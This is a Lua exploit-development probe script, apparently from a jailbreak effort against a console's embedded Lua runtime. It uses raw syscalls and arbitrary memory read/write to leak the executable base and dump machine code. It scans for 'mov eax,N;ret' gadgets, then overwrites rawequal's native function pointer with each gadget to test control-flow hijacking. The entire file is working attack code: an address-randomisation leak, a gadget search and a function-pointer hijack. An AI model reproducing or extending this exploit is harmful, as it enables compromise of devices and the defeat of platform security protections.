-- CRASH_CLASS: LOW
-- PROBE 56d4: Find a clean mov eax,1;ret gadget
--
-- 56d3v4 showed rawequal has B8 01 00 00 at fn+0x3C but only printed
-- 64 bytes. The epilogues have extra pops (pop rbx; pop r14; pop rbp)
-- that break the stack when entering at the gadget. Need either:
-- a) B8 01 00 00 00 C3 (pure mov eax,1;ret — 6 bytes)
-- b) B8 01 00 00 00 5D C3 (mov eax,1;pop rbp;ret — need 1 push before)
-- c) 6A 01 58 C3 (push 1;pop rax;ret — stack-balanced)
-- d) Any sequence that sets rax=1..5 with balanced stack
--
-- Strategy: full 128-byte dump of 8 functions + scan 64KB around them

print("=== PROBE 56d4: FIND RET1 GADGET ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local tlo = rd(N(info) + 0x108) or 0
local thi = rd(N(info) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

-- Get fn offsets from CClosures
local function fn_off(fn)
    local s = tostring(fn)
    local a = s:match("0x([0-9a-fA-F]+)") or s:match(": ([0-9a-fA-F]+)$") or s:match(": (%d+)$")
    if not a then return nil end
    local addr = tonumber(a, 16) or tonumber(a)
    if not addr then return nil end
    local ptr = rq(addr + 0x20)
    return N(ptr) - tlo
end

local re_off = fn_off(rawequal)
print(string.format("rawequal fn=eboot+0x%X", re_off))

-- ============ PART 1: Full 128-byte dump of rawequal ============
print("")
print("[1] rawequal full 128-byte dump")
for row = 0, 7 do
    local hex = {}
    local base = row * 16
    for i = 0, 15 do
        local addr = tlo + re_off + base + i
        local dw = rd(addr - (addr % 4))  -- align to dword
        if dw then
            local shift = ((addr % 4)) * 8
            local b = math.floor(dw / (2^shift)) % 256
            hex[#hex + 1] = string.format("%02X", b)
        else
            hex[#hex + 1] = "??"
        end
    end
    print(string.format("  +%02X: %s", base, table.concat(hex, " ")))
end

-- ============ PART 2: Chunk scan around Lua funcs ============
-- Scan 64KB centered on rawequal's function area
print("")
local scan_base = re_off - (re_off % 0x4000)  -- align to 16KB
print(string.format("[2] Scan eboot+0x%X..+0x%X (64KB)", scan_base, scan_base + 0x10000))

local gadgets = {}
local CHUNK = 0x4000
for chunk_off = 0, 0x10000 - CHUNK, CHUNK do
    local cs = scan_base + chunk_off
    local dwords = {}
    local count = CHUNK / 4
    for i = 0, count - 1 do
        dwords[i] = rd(tlo + cs + i * 4) or 0
    end

    for i = 0, count - 2 do
        local d0 = dwords[i]
        local d1 = dwords[i + 1]
        local b = {}
        b[0] = d0 % 256
        b[1] = math.floor(d0 / 256) % 256
        b[2] = math.floor(d0 / 65536) % 256
        b[3] = math.floor(d0 / 16777216) % 256
        b[4] = d1 % 256
        b[5] = math.floor(d1 / 256) % 256
        b[6] = math.floor(d1 / 65536) % 256
        b[7] = math.floor(d1 / 16777216) % 256

        for s = 0, 3 do
            -- B8 XX 00 00 00 C3 (mov eax,N;ret — pure, no extra pops)
            if s <= 2 and b[s] == 0xB8 and b[s+2] == 0 and b[s+3] == 0
               and b[s+4] == 0 and b[s+5] == 0xC3 then
                local val = b[s+1]
                if val >= 1 and val <= 20 and not gadgets[val] then
                    local off = cs + i * 4 + s
                    gadgets[val] = {off = off, kind = "mov;ret"}
                    print(string.format("  *** mov eax,%d;ret at eboot+0x%X ***", val, off))
                end
            end
            -- 6A XX 58 C3 (push N;pop rax;ret — stack balanced)
            if s <= 4 and b[s] == 0x6A and b[s+2] == 0x58 and b[s+3] == 0xC3 then
                local val = b[s+1]
                if val >= 1 and val <= 20 and not gadgets[val] then
                    local off = cs + i * 4 + s
                    gadgets[val] = {off = off, kind = "push;pop;ret"}
                    print(string.format("  *** push %d;pop rax;ret at eboot+0x%X ***", val, off))
                end
            end
        end
    end

    dwords = nil
    collectgarbage("collect")
end

-- Summary
print("")
print("[3] Clean gadgets found:")
local found = false
for val = 0, 20 do
    if gadgets[val] then
        print(string.format("  rax=%d → %s at eboot+0x%X", val, gadgets[val].kind, gadgets[val].off))
        found = true
    end
end
if not found then print("  NONE") end

-- ============ PART 3: Test if any found ============
if found then
    local function eaddr(off)
        return uint64(string.format("0x%X%08X", thi, tlo + off))
    end
    local function fmt(v)
        if v == nil then return "nil" end
        if type(v) == "table" and v.h then
            local h, l = v.h, v.l
            if h < 0 then h = h + 0x100000000 end
            if l < 0 then l = l + 0x100000000 end
            return string.format("0x%08X%08X", h, l)
        end
        return tostring(v)
    end
    local function vtype(v)
        local ok, t = pcall(type, v)
        if ok then return t end return "?"
    end

    local re_s = tostring(rawequal)
    local re_a = tonumber(re_s:match("0x([0-9a-fA-F]+)") or re_s:match(": ([0-9a-fA-F]+)$") or re_s:match(": (%d+)$"), 16)
        or tonumber(re_s:match(": (%d+)$"))

    print("")
    print("[4] Tests")
    for _, val in ipairs({1, 2, 3}) do
        if gadgets[val] and alive() then
            print(string.format("  --- rax=%d (%s +0x%X) ---", val, gadgets[val].kind, gadgets[val].off))
            local saved = rq(re_a + 0x20)
            pcall(function() memory.write_qword(re_a + 0x20, eaddr(gadgets[val].off)) end)
            local r = {pcall(rawequal, 111, 222)}
            pcall(function() memory.write_qword(re_a + 0x20, saved) end)
            local parts = {}
            for i = 2, math.min(#r, 8) do
                parts[#parts + 1] = fmt(r[i]) .. "(" .. vtype(r[i]) .. ")"
            end
            print(string.format("    ok=%s nret=%d [%s] alive=%s",
                tostring(r[1]), #r - 1, table.concat(parts, ", "), tostring(alive())))
        end
    end
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56d4 COMPLETE ===")
